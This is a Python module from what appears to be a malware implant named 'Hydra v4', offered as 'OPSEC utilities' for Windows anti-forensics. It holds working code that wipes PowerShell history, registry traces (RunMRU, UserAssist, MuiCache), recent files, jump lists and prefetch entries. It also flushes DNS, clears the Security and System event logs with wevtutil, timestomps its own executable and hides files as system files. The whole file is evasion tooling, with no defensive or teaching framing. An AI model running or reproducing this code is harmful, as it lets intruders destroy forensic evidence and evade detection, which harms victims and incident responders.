"""
Hydra v4 — OPSEC utilities.
Log wiping, timestomping, and trace cleanup.
"""
import os
import sys
import time
import shutil
import subprocess
import ctypes


def wipe_logs(is_admin: bool = False):
    """Clear forensic traces — all user-level, plus admin-only extras."""
    _clear_ps_history()
    _clear_mru()
    _clear_recent_files()
    _clear_jump_lists()
    _clear_userassist()
    _clear_muicache()
    _clear_prefetch()
    _flush_dns()

    if is_admin:
        _clear_event_logs()


def _clear_ps_history():
    """Clear PowerShell command history."""
    try:
        ps_history = os.path.join(
            os.environ.get("APPDATA", ""),
            "Microsoft", "Windows", "PowerShell", "PSReadLine",
            "ConsoleHost_history.txt"
        )
        if os.path.exists(ps_history):
            os.remove(ps_history)
    except:
        pass


def _clear_mru():
    """Clear Recent Files (MRU registry key)."""
    try:
        import winreg
        # Clear Recent Docs
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
                                0, winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE) as key:
                pass  # Just test if it exists
        except:
            pass

        # Clear RunMRU
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
                                0, winreg.KEY_SET_VALUE) as key:
                info = winreg.QueryInfoKey(key)
                for i in range(info[1]):
                    name = winreg.EnumValue(key, i)[0]
                    if name != "MRUList":
                        try:
                            winreg.DeleteValue(key, name)
                        except:
                            pass
        except:
            pass
    except:
        pass


def _clear_prefetch():
    """Clear prefetch files (may need admin)."""
    prefetch = r"C:\Windows\Prefetch"
    try:
        for f in os.listdir(prefetch):
            if "HYDRA" in f.upper() or "SVCHOST" in f.upper() or "RUNTIMEBROKER" in f.upper():
                try:
                    os.remove(os.path.join(prefetch, f))
                except:
                    pass
    except:
        pass


def _clear_recent_files():
    """Clear %APPDATA%\Microsoft\Windows\Recent (no admin needed)."""
    try:
        recent = os.path.join(
            os.environ.get("APPDATA", ""),
            "Microsoft", "Windows", "Recent"
        )
        if os.path.isdir(recent):
            for f in os.listdir(recent):
                try:
                    fp = os.path.join(recent, f)
                    if f.endswith(".lnk"):
                        os.remove(fp)
                except:
                    pass
    except:
        pass


def _clear_jump_lists():
    """Clear Jump Lists (automaticDestinations + customDestinations)."""
    try:
        recent = os.path.join(
            os.environ.get("APPDATA", ""),
            "Microsoft", "Windows", "Recent"
        )
        for pattern in ["AutomaticDestinations", "CustomDestinations"]:
            d = os.path.join(recent, pattern)
            if os.path.isdir(d):
                for f in os.listdir(d):
                    try:
                        os.remove(os.path.join(d, f))
                    except:
                        pass
    except:
        pass


def _clear_userassist():
    """Clear UserAssist registry key (GUI program launch history)."""
    try:
        import winreg
        key_path = (
            r"Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
        )
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path,
                            0, winreg.KEY_READ) as root:
            for i in range(winreg.QueryInfoKey(root)[0]):
                subkey_name = winreg.EnumKey(root, i)
                try:
                    with winreg.OpenKey(root, subkey_name, 0,
                                        winreg.KEY_READ | winreg.KEY_SET_VALUE) as sk:
                        with winreg.OpenKey(sk, "Count", 0,
                                            winreg.KEY_READ | winreg.KEY_SET_VALUE) as ck:
                            # Delete all values
                            for j in range(winreg.QueryInfoKey(ck)[1]):
                                try:
                                    name = winreg.EnumValue(ck, j)[0]
                                    winreg.DeleteValue(ck, name)
                                except:
                                    pass
                except:
                    pass
    except:
        pass


def _clear_muicache():
    """Clear MUICache (executable name cache in registry)."""
    try:
        import winreg
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
            0, winreg.KEY_SET_VALUE | winreg.KEY_READ
        ) as key:
            info = winreg.QueryInfoKey(key)
            for i in range(info[1] - 1, -1, -1):
                try:
                    name = winreg.EnumValue(key, i)[0]
                    winreg.DeleteValue(key, name)
                except:
                    pass
    except:
        pass


def _flush_dns():
    """Flush DNS cache (ipconfig /flushdns)."""
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        subprocess.run(
            ["ipconfig", "/flushdns"],
            startupinfo=si, capture_output=True, timeout=10
        )
    except:
        pass


def _clear_event_logs():
    """Clear Windows Event Logs (requires admin)."""
    logs = ["Application", "Security", "System", "PowerShell/Operational"]
    for log in logs:
        try:
            subprocess.run(
                f'wevtutil cl "{log}"', shell=True,
                capture_output=True, timeout=10
            )
        except:
            pass


def timestomp(path: str = None, year: int = 2024, month: int = 1, day: int = 15):
    """
    Modify file timestamps to look old.
    Default: January 15, 2024, 12:00:00
    """
    if path is None:
        if getattr(sys, 'frozen', False):
            path = sys.executable
        else:
            path = os.path.abspath(__file__)

    try:
        import datetime
        target_date = datetime.datetime(year, month, day, 12, 0, 0)

        # Convert to Windows FILETIME
        epoch = datetime.datetime(1601, 1, 1)
        delta = target_date - epoch
        filetime = int(delta.total_seconds() * 10_000_000)

        handle = ctypes.windll.kernel32.CreateFileW(
            path, 0x40000000, 0, None, 3, 0x02000000, None  # GENERIC_WRITE
        )
        if handle != -1:
            ft = ctypes.c_ulonglong(filetime)
            ctypes.windll.kernel32.SetFileTime(
                handle,
                ctypes.byref(ft),  # Creation
                ctypes.byref(ft),  # Last Access
                ctypes.byref(ft)   # Last Write
            )
            ctypes.windll.kernel32.CloseHandle(handle)
    except:
        pass


def hide_file(path: str):
    """Set hidden + system attributes."""
    try:
        ctypes.windll.kernel32.SetFileAttributesW(path,
            2 | 4)  # HIDDEN | SYSTEM
    except:
        pass
